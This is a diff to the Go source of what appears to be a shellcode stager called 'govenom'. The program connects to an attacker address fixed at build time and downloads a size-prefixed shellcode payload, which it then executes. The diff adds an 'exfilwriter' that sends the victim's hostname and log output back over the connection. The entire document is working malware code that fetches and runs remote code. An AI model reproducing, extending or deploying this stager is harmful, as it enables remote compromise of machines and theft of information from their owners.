@@ -3,21 +3,25 @@ package main
 import (
 	"encoding/binary"
 	"fmt"
+	"govenom/exfilwriter"
 	"io"
 	"log"
 	"net"
+	"os"
 )
 
 var (
 	// set during compilation/linking via -X ldflag
-	address string
+	address  string
+	network  string
+	exfilCfg string
 )
 
-func receiveShellcode(con net.Conn) ([]byte, error) {
+func receiveShellcode(conn net.Conn) ([]byte, error) {
 	sizeBuffer := make([]byte, 4)
 
 	// read shellcode size
-	_, err := con.Read(sizeBuffer)
+	_, err := conn.Read(sizeBuffer)
 	if err != nil {
 		return nil, fmt.Errorf("could not receive shellcode size: %v", err)
 	}
@@ -25,7 +29,7 @@ func receiveShellcode(con net.Conn) ([]byte, error) {
 	fmt.Printf("shellcode size: %d\n", shellcodeSize)
 
 	shellcodeBuffer := make([]byte, shellcodeSize)
-	n, err := io.ReadFull(con, shellcodeBuffer)
+	n, err := io.ReadFull(conn, shellcodeBuffer)
 	if err != nil {
 		return nil, fmt.Errorf("could not receive shellcode: %v", err)
 	}
@@ -38,22 +42,33 @@ func receiveShellcode(con net.Conn) ([]byte, error) {
 }
 
 func main() {
-	con, err := net.Dial("tcp", address)
+	w, errs := exfilwriter.New(exfilCfg)
+	hostname, err := os.Hostname()
 	if err != nil {
-		fmt.Printf("could not connect to %s: %s\n", address, err)
-		return
-		// TODO: report back through another channel (DNS, ...)
+		hostname = "unknown"
 	}
-	log.SetOutput(con)
+	log := log.New(w, fmt.Sprintf("%s: ", hostname), 0)
 
-	shcode, err := receiveShellcode(con)
+	conn, err := net.Dial(network, address)
 	if err != nil {
-		fmt.Println(err)
-		return
+		log.Fatalf("could not connect to %s: %s\n", address, err)
 	}
-	fmt.Printf("received %d bytes of shellcode\n", len(shcode))
+
+	w.AddExfiltrator(conn)
+	// send out debuglog configuration errors *at least* over TCP
+	if len(errs) > 0 {
+		for _, err := range errs {
+			log.Println(err)
+		}
+	}
+
+	shcode, err := receiveShellcode(conn)
+	if err != nil {
+		log.Fatal(err)
+	}
+	log.Printf("received %d bytes of shellcode\n", len(shcode))
 	err = execShellcode(shcode)
 	if err != nil {
-		fmt.Printf("shellcode execution failed: %v", err)
+		log.Fatalf("shellcode execution failed: %v", err)
 	}
 }
